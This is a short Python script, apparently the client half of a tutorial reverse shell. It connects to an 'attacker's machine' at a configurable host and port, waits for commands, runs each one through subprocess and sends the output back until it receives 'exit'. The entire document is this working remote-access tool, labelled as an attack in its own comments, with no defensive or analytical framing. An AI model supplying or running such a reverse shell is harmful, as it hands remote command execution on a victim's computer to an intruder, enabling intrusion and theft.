import socket
import subprocess

# put the IP address of the attacker's machine here
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5003
SERVER_SIZE = 1024

# create a socket object
s = socket.socket()
# connect to the attacker's machine
s.connect((SERVER_HOST, SERVER_PORT))

# receive the welcome message from the attacker
message = s.recv(SERVER_SIZE).decode()
print("Server:", message)

while True:
    # receive the command from the attacker
    command = s.recv(SERVER_SIZE).decode()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # execute the command and retrieve the results
    output = subprocess.getoutput(command)
    # send the results back to the attacker
    s.send(output.encode())
# close the connection to the attacker
s.close()